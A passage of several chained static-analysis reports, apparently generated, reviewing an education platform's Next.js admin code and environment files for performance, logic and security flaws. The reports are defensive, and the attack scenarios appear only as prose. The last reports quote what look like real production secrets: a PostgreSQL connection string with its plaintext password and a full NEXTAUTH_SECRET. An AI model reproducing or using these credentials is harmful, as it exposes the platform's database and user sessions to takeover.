    const [assignmentsResponse, lessonsResponse, usersResponse] = await Promise.all([
      api.get('/assignments'),
      api.get('/lessons'),
      api.get('/users')
    ]);
    // ...
    setTeachers(usersResponse.data.filter((user: User) => user.role === 'TEACHER'));
    ```
*   **Why:** The application fetches the *entire* user database (`/users`) to the client just to filter for "TEACHER" roles.
*   **Failure Scenario:**
    *   **Performance:** If the platform has 50,000 students, the admin browser will download megabytes of unnecessary JSON, leading to significant lag or crashes.
    *   **Security:** A malicious actor can inspect the network tab and see the names, emails, and IDs of every student in the system, even if they aren't authorized to view student lists.
*   **Fix Strategy:** Implement server-side filtering (e.g., `/api/users?role=TEACHER`) to return only the required subset of data.

### 2. Security: Sensitive Information Leakage in Logs
*   **Issue:** Exposure of raw error objects containing credentials.
*   **Evidence:** `FILE 2`, Line 32:
    ```typescript
    } catch (error) {
      console.error('Auth error:', error);
      return null;
    }
    ```
*   **Why:** When `api.post('/auth/login', ...)` fails, the `error` object (especially from libraries like Axios) often contains the `config` object, which includes the plain-text `email` and `password` sent in the request body.
*   **Failure Scenario:** If the authentication server is down or returns a 4xx error, the user's password could be written to centralized logging systems (like CloudWatch, Vercel logs, or Kibana), where it is visible to any developer or admin with log access.
*   **Fix Strategy:** Log only specific error properties (e.g., `error.message`, `error.code`, or a custom sanitized message) instead of the entire object.

### 3. Reliability: Brittle Date Parsing & Localization
*   **Issue:** Unsafe instantiation of `Date` objects from API strings.
*   **Evidence:** `FILE 1`, Lines 54-61:
    ```typescript
    const formatDate = (dateString: string) => {
      return new Date(dateString).toLocaleDateString('en-US', { ... });
    };
    ```
*   **Why:** There is no validation that `dateString` is a valid ISO string. `new Date(undefined)` or an invalid string returns `Invalid Date`.
*   **Failure Scenario:** If the backend returns an empty string or an unexpected date format for "recent activity," the UI will render "Invalid Date," or in some older browser environments, calling `toLocaleDateString` on an invalid date can cause a runtime crash.
*   **Fix Strategy:** Add a validation check for the date string and provide a fallback string (e.g., "N/A") or use a robust date library with strict parsing.

### 4. Security: Insecure Token Persistence Strategy
*   **Issue:** Potential Token Desynchronization / Lack of Refresh Logic.
*   **Evidence:** `FILE 2`, Lines 38-51:
    ```typescript
    async jwt({ token, user }) {
      if (user) {
        token.accessToken = user.accessToken;
        token.role = user.role;
      }
      return token;
    }
    ```
*   **Why:** The `accessToken` is captured only during the initial login. There is no logic to handle token expiration or "silent refresh."
*   **Failure Scenario:** The NextAuth session might be valid for 30 days, but the backend `accessToken` might expire in 1 hour. The user will remain "logged in" to the Admin dashboard but all subsequent API calls (`analytics`, `assignments`) will fail with 401 errors, resulting in a broken, "stuck" UI.
*   **Fix Strategy:** Implement a `refreshToken` flow within the `jwt` callback to rotate the access token before it expires.

### 5. Logic: State Inconsistency (Race Conditions)
*   **Issue:** Missing Request Cancellation.
*   **Evidence:** `FILE 1`, Lines 45-49:
    ```typescript
    useEffect(() => {
      if (isAuthenticated) {
        loadAnalytics();
      }
    }, [isAuthenticated, loadAnalytics]);
    ```
*   **Why:** If a user toggles the `timeRange` dropdown rapidly, multiple `loadAnalytics` calls are triggered. Since network requests resolve at different speeds, an older request (e.g., for 90 days) might finish *after* a newer request (e.g., for 7 days).
*   **Failure Scenario:** The user selects "Last 7 days," but the dashboard eventually displays data for "Last 90 days" because that request was slower to resolve, causing the UI state to be out of sync with the dropdown selection.
*   **Fix Strategy:** Utilize an `AbortController` to cancel previous pending requests when a new request is initiated, or use a data-fetching library like TanStack Query.

### 6. Forensic Integrity: Truncated Source Files
*   **Issue:** Incomplete file content prevents a comprehensive audit.
*   **Evidence:** 
    *   `FILE 1` cuts off at Line 144 (`<div style={{ fontSize: '0.875rem', color: '#666', marginBottom: '0.5rem' }}>T`).
    *   `FILE 3` cuts off mid-function (`handleDownloadSubmissions`).
*   **Why:** Critical logic for rendering, XSS prevention, and further API interactions is missing.
*   **Failure Scenario:** Potential vulnerabilities (like `dangerouslySetInnerHTML`) or logic bugs in the remaining code cannot be identified or mitigated.
*   **Fix Strategy:** Retrieve and analyze the full content of these components to ensure closing tags and subsequent logic are secure.


---

### Forensic Static Analysis Report: Admin Portal & Chat Modules

**Scope:** `login.tsx`, `register.tsx`, `chat.tsx`

---

#### 1. Insecure Token Storage (CWE-312)
*   **Issue:** Sensitive authentication tokens are stored in `localStorage`.
*   **Evidence:** 
    *   `login.tsx`: `localStorage.setItem('authToken', response.data.token);`
    *   `register.tsx`: `localStorage.setItem('authToken', response.data.token);`
*   **Why:** `localStorage` is accessible via any JavaScript running on the page. It lacks the protection of the `HttpOnly` flag, making the application highly susceptible to token theft via Cross-Site Scripting (XSS).
*   **Failure Scenario:** An attacker successfully injects a script (e.g., via a malicious chat message or a user profile field). The script calls `localStorage.getItem('authToken')` and sends the admin's session token to an external server, allowing full account takeover.
*   **Fix Strategy:** Store authentication tokens in `httpOnly`, `Secure`, and `SameSite=Strict` cookies.

#### 2. Potential Insecure Direct Object Reference (IDOR) (CWE-639)
*   **Issue:** Message retrieval and status updates rely solely on client-provided IDs.
*   **Evidence:**
    *   `chat.tsx`: `api.get('/messages/${userId}')`
    *   `chat.tsx`: `api.put('/messages/read/${userId}')`
*   **Why:** The client explicitly tells the server which user's messages to fetch or mark as read. If the backend does not verify that the authenticated requester is a participant in that specific conversation, an attacker can access any user's data.
*   **Failure Scenario:** An authenticated user modifies the `userId` in the browser console to a known UUID of another user. The server returns the private chat history of that user because it only checked if the requester was "logged in," not if they were "authorized" for that specific resource.
*   **Fix Strategy:** Implement server-side authorization checks to ensure the `requesterId` (from the session) matches the `senderId` or `receiverId` of the requested resources.

#### 3. Information Leakage via Verbose Error Responses (CWE-209)
*   **Issue:** Backend error messages are piped directly to the user interface.
*   **Evidence:**
    *   `login.tsx`: `setError(err.response?.data?.error || 'Login failed');`
*   **Why:** Raw backend errors can reveal account existence or internal logic (e.g., "User not found" vs. "Incorrect password").
*   **Failure Scenario:** An attacker performs an "Account Enumeration" attack by testing a list of emails. The specific error messages allow them to confirm which emails are registered in the system, narrowing the target list for a brute-force or phishing campaign.
*   **Fix Strategy:** Use generic error messages for authentication failures (e.g., "Invalid email or password").

#### 4. Asynchronous Race Conditions (CWE-362)
*   **Issue:** Chat messages can be overwritten by stale network responses.
*   **Evidence:**
    *   `chat.tsx`: `useEffect(() => { if (selectedUser) { loadMessages(selectedUser.id); } }, [selectedUser]);`
*   **Why:** `loadMessages` is async. If a user clicks between multiple names quickly, the response for an earlier click might arrive *after* the latest one.
*   **Failure Scenario:** Admin clicks "User A," then "User B." The data for B arrives in 50ms, but the data for A (delayed by network) arrives at 200ms and populates the UI. The admin is now looking at User A's messages while the UI indicates they are talking to User B.
*   **Fix Strategy:** Use an `AbortController` to cancel previous requests or implement a "cleanup" flag in `useEffect` to ignore responses from stale IDs.

#### 5. Logic Flaw in Invitation-to-Registration Flow
*   **Issue:** Registration data is not bound to the validated invitation state on the client.
*   **Evidence:**
    *   `register.tsx`: `invitationCode` is retrieved from the URL and used to fetch `email`, but the final `api.post` sends `formData.email`.
*   **Why:** The UI allows the user to potentially modify the `email` field after the invitation has been "validated."
*   **Failure Scenario:** An attacker receives an invitation meant for `intern@company.com`. After the page validates the code, the attacker changes the email field to `ceo@company.com` before submitting. If the backend only checks if the *code* is valid but doesn't check if the *code matches the email*, the attacker registers as the CEO.
*   **Fix Strategy:** The server must verify that the `invitationCode` specifically authorizes the exact `email` address provided in the registration payload.

#### 6. Client-Side Only Security Constraints (CWE-602)
*   **Issue:** Critical security policies (password length) are enforced only on the frontend.
*   **Evidence:**
    *   `register.tsx`: `if (formData.password.length < 8) { setError(...); return; }`
*   **Why:** Frontend checks are bypassable by any user with basic technical knowledge.
*   **Failure Scenario:** An attacker uses a tool like `curl` or Postman to send a POST request directly to the `/auth/register` endpoint with a 1-character password. The server accepts it because it relies on the "client" to do the validation.
*   **Fix Strategy:** Mirror and strictly enforce all validation rules on the backend API.

#### 7. Missing Real-Time Data Integrity
*   **Issue:** The chat UI is static and does not reflect incoming data.
*   **Evidence:**
    *   `chat.tsx`: `setMessages` is only called after the *local* user sends a message.
*   **Why:** There is no polling or WebSocket implementation to fetch new messages from the other participant.
*   **Failure Scenario:** Two admins are coordinating an emergency. Admin A sends a message, but Admin B never sees it because their screen only updates if they manually switch users or send a message themselves, leading to a critical communication failure.
*   **Fix Strategy:** Implement WebSockets (e.g., Socket.io) or an SWR-based polling mechanism for real-time state synchronization.


---

### Forensic Analysis Report

**Analysis Target:** `classes.tsx`, `index.tsx`, `lessons.tsx`
**Status:** **CRITICAL FAILURES DETECTED**

---

#### 1. Source Code Truncation (Structural Integrity)
*   **Issue:** All three provided source files are truncated/incomplete.
*   **Evidence:** 
    *   `classes.tsx` ends at line 147: `<h1>Mana`
    *   `index.tsx` ends at line 105: `...cursor: 'pointer' }}`
    *   `lessons.tsx` ends at line 147: `document.body.appendChild(link);`
*   **Why:** The files are cut off mid-sentence/mid-bracket, indicating a transfer error or incomplete generation.
*   **Failure Scenario:** The application will fail to compile (Syntax Error: Unexpected end of input). Even if compiled, the UI will be broken and non-functional.
*   **Fix Strategy:** Restore the full source code ensuring all JSX tags, functions, and export statements are closed.

#### 2. Resource Leak: Blob URL Management (`lessons.tsx`)
*   **Issue:** Memory leak in `handleDownloadLesson`.
*   **Evidence:** `const url = window.URL.createObjectURL(new Blob([response.data]));` is called, but there is no call to `URL.revokeObjectURL(url)`.
*   **Why:** Browser-created Object URLs persist in memory until the document is unloaded or manually revoked.
*   **Failure Scenario:** If an admin downloads multiple lessons/PDFs in a single session, the browser's memory usage will climb indefinitely, eventually causing the tab to crash or slow down the system.
*   **Fix Strategy:** Implement a cleanup step using `window.URL.revokeObjectURL(url)` after the virtual click event on the download link.

#### 3. Authentication Inconsistency (`lessons.tsx`)
*   **Issue:** Missing token synchronization for API calls.
*   **Evidence:** `index.tsx` and `classes.tsx` explicitly extract `token` from `useAuth` and use `setAuthToken(token)` or pass it to hooks. `lessons.tsx` (Line 43) only extracts `isAuthenticated` and calls `api.get` without ensuring the `token` header is set for that specific page context.
*   **Why:** The global `api` instance (from `lib/api`) stateful behavior is being relied upon inconsistently across pages.
*   **Failure Scenario:** If a user navigates directly to `/lessons`, the `api` client may not have the Bearer token set, resulting in `401 Unauthorized` errors for all data fetching (`/lessons`, `/subjects`, `/users`).
*   **Fix Strategy:** Extract `token` from `useAuth` in `lessons.tsx` and use a `useEffect` hook to ensure `setAuthToken` is called before `loadData` executes.

#### 4. Data Misrepresentation: Hardcoded Stats (`index.tsx`)
*   **Issue:** The "Classes" statistic is hardcoded to zero.
*   **Evidence:** Line 88: `<StatsCard title="Classes" value={0} subtitle='${teachers.length} teachers' ... />`
*   **Why:** The `analytics` object is available but ignored for this specific card, and no "classes" count is fetched in the `useEffect` block.
*   **Failure Scenario:** Admins will see "0" classes even if classes exist in the system, leading to incorrect reporting and lack of trust in the dashboard's accuracy.
*   **Fix Strategy:** Update the `StatsCard` to use `analytics.totalClasses` (if available) or fetch the class count specifically from the `/classes` endpoint as done in the classes page.

#### 5. Logic Error: Teacher ID Ambiguity (`classes.tsx`)
*   **Issue:** Potential mismatch between User ID and Teacher Profile ID.
*   **Evidence:** Line 57: `teacherId: '', // This will be teacherProfile.id`. Line 72: `setTeachers(usersResponse.data.filter((u: any) => u.teacherProfile && u.isActive));`.
*   **Why:** The code filters for *Users* who have a profile, but the form state comment suggests it expects the `teacherProfile.id`.
*   **Failure Scenario:** If the dropdown/form sends the `User.id` instead of the `TeacherProfile.id`, the backend relation link will fail (Foreign Key constraint violation) because the API expects the profile reference, not the account reference.
*   **Fix Strategy:** Explicitly map the filtered users to an object that clearly distinguishes between `userId` and `teacherProfileId` to ensure the correct ID is passed to `api.post`.

#### 6. Inefficient Data Fetching (`index.tsx`)
*   **Issue:** Redundant and unoptimized API calls.
*   **Evidence:** `useDashboard(token)` is called (fetching analytics), then a separate `api.get('/users')` is called inside a `useEffect`. 
*   **Why:** The `useDashboard` hook should ideally return all necessary data for the dashboard summary.
*   **Failure Scenario:** The page makes multiple overlapping requests to the backend on mount, increasing server load and potentially causing UI "flicker" as different pieces of data load at different times.
*   **Fix Strategy:** Consolidate the teacher count logic into the `useDashboard` hook or the backend analytics endpoint to provide a single, atomic data source for the dashboard.


---

### Forensic Analysis Report

#### 1. Issue: Critical Source Truncation (Systemic)
*   **Evidence:** 
    *   `levels.tsx`: Ends at line 145 mid-declaration (`const levelsR`).
    *   `live-classes.tsx`: Ends at line 143 mid-declaration (`const formatDa`).
    *   `quizzes.tsx`: Ends at line 133 mid-type definition (`type: 'multi`).
*   **Why:** The source code provided is physically incomplete, terminating before closing blocks or completing functional logic.
*   **Failure Scenario:** The application will fail to compile due to syntax errors. Features like date formatting and quiz question management will be entirely non-functional.
*   **Fix Strategy:** Complete the truncated implementations and ensure all JSX/Logic blocks are properly closed.

#### 2. Issue: Interface Property Mismatch (Type Safety)
*   **Evidence:** In `live-classes.tsx`, the `User` interface (lines 28-31) lacks a `role` property. However, line 67 attempts to access `u.role` during a filter operation: `u.role === 'TEACHER'`.
*   **Why:** The local type definition does not account for the properties used in the component logic.
*   **Failure Scenario:** TypeScript will throw a compilation error. If bypassed with `any`, the logic will fail at runtime if the API response does not include a `role` field, resulting in an empty "Teachers" list.
*   **Fix Strategy:** Synchronize the `User` interface across files to include the `role: string` property.

#### 3. Issue: Redundant Server-Side Imports
*   **Evidence:** All three files import `getSession` from `next-auth/react` and `GetServerSidePropsContext` from `next`, but neither is used in the provided code.
*   **Why:** These are server-side utilities being imported into client-side component files without any accompanying `getServerSideProps` implementation.
*   **Failure Scenario:** Increased bundle size and potential confusion during maintenance regarding the rendering strategy of the pages.
*   **Fix Strategy:** Remove unused imports to keep the bundle lean and the code clean.

#### 4. Issue: Brittle Client-Side ID Generation
*   **Evidence:** `quizzes.tsx` generates IDs using `q-${index}` (line 103) and `q-${Date.now()}` (line 130).
*   **Why:** Using array indices or timestamps for IDs in a distributed system is prone to collisions and state sync issues.
*   **Failure Scenario:** If multiple questions are added rapidly, `Date.now()` may produce duplicate IDs. If the backend expects its own ID format, these temporary strings may cause database primary key violations.
*   **Fix Strategy:** Utilize a UUID library for temporary client IDs or delegate ID generation entirely to the backend database.

#### 5. Issue: Misleading Aggregate Error Messaging
*   **Evidence:** In `live-classes.tsx`, `loadData` (lines 60-72) wraps three distinct API calls (`/live-sessions`, `/classes`, `/users`) in a single `Promise.all` with a generic catch block.
*   **Why:** If the `/users` call fails, the error message displayed is "Failed to load live sessions," which is contextually incorrect.
*   **Failure Scenario:** Developers and users will be misdirected during troubleshooting, looking for issues in the sessions service when the user service is the actual point of failure.
*   **Fix Strategy:** Implement granular error handling for each API call or use `Promise.allSettled` to identify specific service failures.

#### 6. Issue: Missing Business Logic Validation
*   **Evidence:** `quizzes.tsx` (line 97) validates the presence of a title and subject but fails to validate numeric relationships (e.g., `passingScore <= maxScore`) or answer consistency.
*   **Why:** Basic presence checks are insufficient for complex data structures like Quizzes.
*   **Failure Scenario:** A user could accidentally create a quiz with a passing score higher than the maximum possible score, or a question where the `correctAnswer` does not match any of the provided `options`.
*   **Fix Strategy:** Implement a validation layer that checks numeric ranges and ensures the `correctAnswer` is present within the `options` array before API submission.


---

Based on a forensic static analysis of the provided code, the following issues have been identified:

### 1. Unsafe Property Access (Potential Runtime Crash)
*   **Issue:** Accessing `id` on the `school` object without validation.
*   **Evidence:** `FILE 2`, Lines 52-56: 
    ```typescript
    const schoolResponse = await api.get('/schools/current');
    const school = schoolResponse.data;
    await api.post(`/schools/${school.id}/subjects`, ...);
    ```
*   **Why:** There is no check to ensure `schoolResponse.data` is an object or contains an `id` field.
*   **Failure Scenario:** If the user is an administrator not currently associated with a school, or if the API returns an empty response/error, `school` will be null or undefined. Accessing `school.id` will throw a `TypeError`, crashing the execution of the subject creation handler.
*   **Fix Strategy:** Implement a guard clause or optional chaining with a fallback to verify the existence of the school and its ID before proceeding with the POST request.

### 2. Client-Side Filtering Performance Bottleneck
*   **Issue:** Fetching full user datasets and filtering in the browser.
*   **Evidence:** `FILE 1`, Line 64:
    ```typescript
    setTeachers(usersResponse.data.filter((user: User) => user.role === 'TEACHER'));
    ```
*   **Why:** The code requests all users from the `/users` endpoint and relies on JavaScript to filter for teachers.
*   **Failure Scenario:** In a production environment with thousands of users, the API response size will be massive, leading to high memory consumption, slow network transfer, and UI "jank" as the main thread processes the large array filter operation.
*   **Fix Strategy:** Utilize server-side filtering by adding query parameters (e.g., `/users?role=TEACHER`) to the API request.

### 3. Brittle Filename Parsing
*   **Issue:** Using `split('.')[0]` to determine the resource title.
*   **Evidence:** `FILE 1`, Line 84:
    ```typescript
    title: file.name.split('.')[0],
    ```
*   **Why:** The logic assumes the first period in a filename separates the name from the extension.
*   **Failure Scenario:** If a user uploads a file named `final.report.v2.pdf`, the application will title it "final", losing significant identifying information.
*   **Fix Strategy:** Use a more robust string manipulation method to remove only the substring following the last occurrence of a period.

### 4. Silent Error Swallowing (Data Inconsistency)
*   **Issue:** Overly broad catch block on a specific data stream.
*   **Evidence:** `FILE 1`, Line 61:
    ```typescript
    api.get('/media').catch(() => ({ data: [] }))
    ```
*   **Why:** If the media endpoint fails, the error is caught and replaced with an empty array, which is then merged into the successful responses of other calls.
*   **Failure Scenario:** If the media server is down, the user will see an empty resources list without any error feedback, leading them to believe no resources exist when they actually do.
*   **Fix Strategy:** Track error states per data stream or provide a partial failure notification to the user instead of defaulting to an empty success state.

### 5. Incomplete Mime-Type Mapping (Logic Error)
*   **Issue:** The `text` resource type is unreachable.
*   **Evidence:** `FILE 1`, Lines 95-103 (`getFileType` function).
*   **Why:** The function checks for various types but defaults to `document` at the end. It lacks a specific check for `text` mime-types, despite `text` being a valid value in the `Resource['type']` union.
*   **Failure Scenario:** Uploading a `.txt` file (mime `text/plain`) will result in it being categorized as `document`, potentially causing the wrong viewer component to be initialized.
*   **Fix Strategy:** Add an explicit check for `text` in the mime-type detection logic before the default fallback.

### 6. Architectural/Path Inconsistency
*   **Issue:** Mismatch between resource creation and retrieval paths.
*   **Evidence:** `FILE 2`, Line 42 vs Line 56 vs Line 72.
*   **Why:** Subjects are listed via `/subjects` and deleted via `/subjects/:id` (flat), but created via `/schools/:schoolId/subjects` (nested).
*   **Failure Scenario:** If the backend expects a consistent hierarchy for security/scoping, the flat GET request might return subjects from all schools, or the flat DELETE request might fail due to missing school context in the URL.
*   **Fix Strategy:** Standardize the API routing to be either consistently flat (relying on session-based scoping) or consistently nested (explicitly passing the school ID).

### 7. Inefficient/Redundant API Calls
*   **Issue:** Re-fetching school data on every mutation.
*   **Evidence:** `FILE 2`, Line 52 (`api.get('/schools/current')` inside `handleCreateSubject`).
*   **Why:** The application queries the current school status every time a subject is created.
*   **Failure Scenario:** Users on high-latency connections will experience double the necessary wait time for every subject creation. If the "current school" endpoint is under heavy load, it can block subject creation entirely.
*   **Fix Strategy:** Fetch the school information once during component initialization or retrieve it from a global authentication context.

### 8. Dead Code and Unused Imports
*   **Issue:** Presence of unused Next-auth and Next.js types/functions.
*   **Evidence:** `FILE 1` (Lines 9-10), `FILE 2` (Lines 6-7), `FILE 3` (Lines 6-7).
*   **Why:** `getSession` and `GetServerSidePropsContext` are imported but not used in any of the provided client-side page components.
*   **Failure Scenario:** Increased bundle size and potential confusion for future developers regarding the intended rendering strategy (SSR vs CSR).
*   **Fix Strategy:** Remove unused imports and associated types.

### 9. Duplicate and Inconsistent Type Definitions
*   **Issue:** Redefining shared interfaces locally.
*   **Evidence:** `interface User` defined in `FILE 1`, while `import { User }` is used in `FILE 3`. `interface Subject` defined locally in `FILE 2`.
*   **Why:** Core domain entities are defined multiple times across different files instead of being centralized.
*   **Failure Scenario:** If the backend updates the `Subject` model (e.g., adding a `department` field), the developer might update the interface in one file but forget the other, leading to inconsistent UI behavior and TypeScript bypasses.
*   **Fix Strategy:** Move shared interfaces into a central `types` directory or the shared `api` library.

### 10. Generic Error Messaging
*   **Issue:** Hardcoded error strings ignore backend context.
*   **Evidence:** `FILE 2`, Line 66: `setError('Failed to create subject');`.
*   **Why:** The code discards the actual error message returned by the API response.
*   **Failure Scenario:** If a subject creation fails because the "Subject Code already exists," the user will only see the generic "Failed to create subject" message, providing no actionable feedback on how to fix the input.
*   **Fix Strategy:** Extract and display the error message from the `err.response.data` object.


---

### Forensic Analysis Report

**Engine Status:** Active
**Analysis Scope:** `apps/admin/public/index.html`, `apps/admin/tsconfig.json`, `apps/admin/public/favicon.ico`

---

#### 1. Issue: Structural Truncation (Critical)
- **Evidence:** `index.html` terminates abruptly at line 61: `<div id="live-status" class="status loading">Loading...</div>`.
- **Why:** The file is missing closing tags for the `Live Classes` card, the `.grid` container, the `.container` wrapper, the `<body>`, and the `<html>` root.
- **Failure Scenario:** Browser rendering engines will attempt to auto-repair the DOM, likely nesting subsequent content incorrectly or failing to apply styles to the outer containers. This leads to a broken layout and visual corruption.
- **Fix Strategy:** Restore the missing HTML structure by closing all open tags and ensuring the file contains a proper EOF.

#### 2. Issue: Ghost Selectors / Missing Functional UI
- **Evidence:** `index.html` defines CSS for `#login-section` and `#login-form` (lines 34-35), but these IDs do not exist in the `<body>` markup.
- **Why:** The stylesheet anticipates a login overlay/modal that hasn't been implemented in the HTML, or was deleted.
- **Failure Scenario:** The "Login" button (line 45) will have no target element to manipulate. If a script (currently missing) attempts to toggle the display of `#login-section`, it will throw a null pointer exception.
- **Fix Strategy:** Synchronize the DOM with the CSS by implementing the modal overlay and form markup defined in the styles.

#### 3. Issue: Static State Lock (Non-Functional UI)
- **Evidence:** Multiple elements (`#api-status`, `#lessons-status`, etc.) are hardcoded with the `loading` class and "Loading..." text, but there are no `<script>` tags or external JS references in `index.html`.
- **Why:** There is no logic to handle the transition from "Loading" to "Success" or to fetch data from the API.
- **Failure Scenario:** The dashboard remains perpetually in a "Connecting..." state. Users cannot interact with the platform as the data never populates.
- **Fix Strategy:** Integrate a client-side script or link to a bundle that handles API connectivity, state management, and DOM updates.

#### 4. Issue: Suppressed Type Safety
- **Evidence:** `tsconfig.json` contains `"strict": false` (line 14).
- **Why:** This disables the TypeScript strict mode family of checks (e.g., `noImplicitAny`, `strictNullChecks`).
- **Failure Scenario:** Increases the risk of runtime "Cannot read property of undefined" errors. It allows developers to bypass type safety, leading to a brittle codebase where logic errors are caught by users instead of the compiler.
- **Fix Strategy:** Enable `strict: true` and resolve the resulting type errors to ensure system-wide reliability.

#### 5. Issue: Improper Module Resolution Configuration
- **Evidence:** `tsconfig.json` uses `"moduleResolution": "node"` (line 18) with `"module": "esnext"`.
- **Why:** For modern Next.js/React applications, `node` resolution is legacy. It may fail to correctly resolve exports from modern ESM packages or workspace packages defined in `paths`.
- **Failure Scenario:** Imports from `@auth/core` (mapped to `../../packages/auth`) may fail at build time or resolve to incorrect entry points, causing compilation errors or runtime "module not found" crashes.
- **Fix Strategy:** Update `moduleResolution` to `node16`, `nodenext`, or `bundler` to align with modern ESM standards and the Next.js ecosystem.


---

### Forensic Analysis Report

#### **Issue 1: Exposure of Build Artifacts in Version Control**
- **Evidence:** `FILE 1: C:\Users\user\Desktop\edu_platform\apps\admin\tsconfig.tsbuildinfo`.
- **Why:** The `.tsbuildinfo` file is an internal cache generated by TypeScript for incremental builds. It contains machine-specific metadata and relative paths (e.g., `../../node_modules/...`) that are unique to the local environment where the build was executed.
- **Failure Scenario:** Committing this file leads to "dirty" repository states and frequent merge conflicts when multiple developers or CI/CD pipelines build the project. It also bloats the repository with non-source data.
- **Fix Strategy:** Remove the file from the repository's tracking and update the root or local `.gitignore` to exclude all `*.tsbuildinfo` files.

#### **Issue 2: Deployment Failure via Incorrect Output Directory**
- **Evidence:** `FILE 3: apps\admin\vercel.json` contains `"outputDirectory": ".next"`.
- **Why:** Next.js applications on Vercel use the `@vercel/next` builder, which automatically manages build outputs. Manually setting `outputDirectory` to `.next` instructs Vercel to treat the internal Next.js build folder as a static site root.
- **Failure Scenario:** API routes and Server-Side Rendered (SSR) pages will fail to function. Vercel will attempt to serve the `.next` directory as static files rather than initializing the required Serverless Functions, resulting in 404 errors for dynamic routes or the exposure of raw server-side code.
- **Fix Strategy:** Remove the `outputDirectory` and `buildCommand` properties from `vercel.json` to allow Vercel to use its optimized "zero-config" detection for Next.js.

#### **Issue 3: Architectural Coupling to Database Types in Frontend Augmentation**
- **Evidence:** `FILE 2: apps\admin\types\next-auth.d.ts` line 4: `import { Role } from '@prisma/client';`.
- **Why:** Importing directly from `@prisma/client` in a frontend application's type declaration creates a hard dependency on the generated Prisma client. In monorepo environments, the Prisma client is often generated in a shared package (e.g., `packages/db`), not within the `admin` app's local `node_modules`.
- **Failure Scenario:** The build will fail in CI/CD or fresh developer environments with the error `Cannot find module '@prisma/client'` because the package is not a direct dependency of the admin app or the client hasn't been generated in that specific context.
- **Fix Strategy:** Centralize common types and enums in a shared workspace package (e.g., `@repo/db` or a dedicated `types` package) and import the `Role` enum from there instead of the low-level database client.

#### **Issue 4: Potential Type Intersection Collapse (NextAuth Session)**
- **Evidence:** `FILE 2: apps\admin\types\next-auth.d.ts` lines 8-12: `user: { id: string; role: Role; schoolId: string; } & DefaultSession['user'];`.
- **Why:** `DefaultSession['user']` is often defined as an optional property (`user?: { ... }`). Intersecting a required object structure with an optional/possibly undefined type can result in a `never` type or unexpected requiredness in TypeScript, depending on the compiler configuration.
- **Failure Scenario:** Developers may encounter TypeScript errors when trying to assign session data, or the `session.user` object might lose its property intellisense if the intersection resolves to `never` because of the optional nature of the base `user` field.
- **Fix Strategy:** Intersect with the base `User` interface or explicitly define the shared fields (`name`, `email`, `image`) rather than intersecting with an optional property type from `DefaultSession`.


---

Based on the forensic static analysis of the provided files, the following issues have been identified:

### 1. Critical Exposure of Production Database Credentials
*   **Evidence:** `FILE 3` (`.env.backup`), Line 1: `DATABASE_URL="postgresql://neondb_owner:npg_8WDE6TeAZRJY@ep-hidden-cloud-adq8iepn-pooler.c-2.us-east-1.aws.neon.tech/neondb?sslmode=require"`
*   **Why:** A production database connection string containing a plaintext username (`neondb_owner`) and password (`npg_8WDE6TeAZRJY`) is hardcoded in a backup file.
*   **Failure Scenario:** An attacker with read access to the repository or filesystem extracts these credentials and gains full administrative access to the production database, enabling data exfiltration, modification, or deletion.
*   **Fix Strategy:** Immediately rotate the database password, delete the `.env.backup` file, and migrate to an environment variable injection system provided by the hosting platform (e.g., Vercel Secrets).

### 2. Critical Exposure of Production Authentication Secret
*   **Evidence:** `FILE 3` (`.env.backup`), Line 2: `NEXTAUTH_SECRET="76c1f139932ef32a9b669f8ef3845fddd2e0169c7cf912b92fd610606976a38dc042982d5734b1eab3b28c57cd1d12557f1f5d9c39012c660c3998a0730cc7289"`
*   **Why:** A high-entropy secret used for signing and encrypting session tokens is hardcoded in a backup file.
*   **Failure Scenario:** An attacker uses this secret to forge valid session cookies or JWTs, allowing them to impersonate any user, including administrators, without knowing their actual passwords.
*   **Fix Strategy:** Revoke the compromised secret, generate a new cryptographically secure 32-character string, and ensure it is only stored in secure, encrypted environment variable managers.

### 3. Invalid Security Configuration (Broken Authentication)
*   **Evidence:** `FILE 2` (`.env`), Line 12: `NEXTAUTH_SECRET=` (Empty value).
*   **Why:** The developer comments on Line 11 state: "It needs to be at least 32 characters long." An empty value violates the application's own security requirements and the underlying library's (NextAuth) requirements.
*   **Failure Scenario:** The API server will either fail to start or reject all authentication attempts from the Admin app (`FILE 1`), as it cannot verify or sign tokens with an empty secret.
*   **Fix Strategy:** Populate the `NEXTAUTH_SECRET` in the local development environment with a unique string and verify that `.env` is listed in `.gitignore` to prevent accidental commits.

### 4. High-Risk Environment Configuration Drift
*   **Evidence:** `FILE 2` defines `CORS_ALLOWED_ORIGINS=http://localhost:3001` (Development context) while `FILE 3` defines `NODE_ENV="production"` (Production context).
*   **Why:** The presence of both development and production configurations in the same directory (and potentially in the same git history) increases the risk of "environment bleeding."
*   **Failure Scenario:** A developer accidentally runs a local build using the settings from `.env.backup`, connecting their local development machine to the live production database, leading to accidental data corruption or loss.
*   **Fix Strategy:** Remove all production-specific environment files from the local workspace. Use `.env.example` as a template for developers and strictly isolate production secrets to the production deployment environment.


---

### FORENSIC ANALYSIS REPORT

#### **Issue 1: Exposure of Critical Database Credentials**
*   **Evidence:** `FILE 2` contains `PGPASSWORD="npg_8WDE6TeAZRJY"`, `POSTGRES_PASSWORD="npg_8WDE6TeAZRJY"`, and multiple connection strings (e.g., `DATABASE_URL`, `POSTGRES_PRISMA_URL`) embedding this password in plain text.
*   **Why:** Hardcoding administrative database credentials in configuration files exposes the entire data layer to anyone with access to the file or the environment where it is stored.
*   **Failure Scenario:** An attacker gains access to the local environment or a misconfigured backup, retrieves the credentials, and performs unauthorized data exfiltration or destructive `DROP TABLE` operations on the Neon production/dev database.
*   **Fix Strategy:** Immediately rotate the database password. Use a secure secret management system (like Vercel Secrets or AWS Secrets Manager) and ensure credentials are only injected at runtime via environment variables, never stored in persistent local files.

#### **Issue 2: Vercel OIDC Token Leakage**
*   **Evidence:** `FILE 2` contains a `VERCEL_OIDC_TOKEN` with a valid JWT structure (`eyJhbGci...`).
*   **Why:** OpenID Connect (OIDC) tokens are high-privilege credentials used to authenticate services. Exposure allows an attacker to impersonate the project owner or a CI/CD runner.
*   **Failure Scenario:** An attacker uses the token to authenticate against Vercel’s API, enabling them to trigger malicious deployments, modify environment variables, or access sensitive project metadata.
*   **Fix Strategy:** Revoke the current OIDC token through the Vercel dashboard. Configure the environment to use short-lived, scoped tokens or machine-specific authentication that does not require persistent storage in `.env.local`.

#### **Issue 3: Functional Configuration Mismatch**
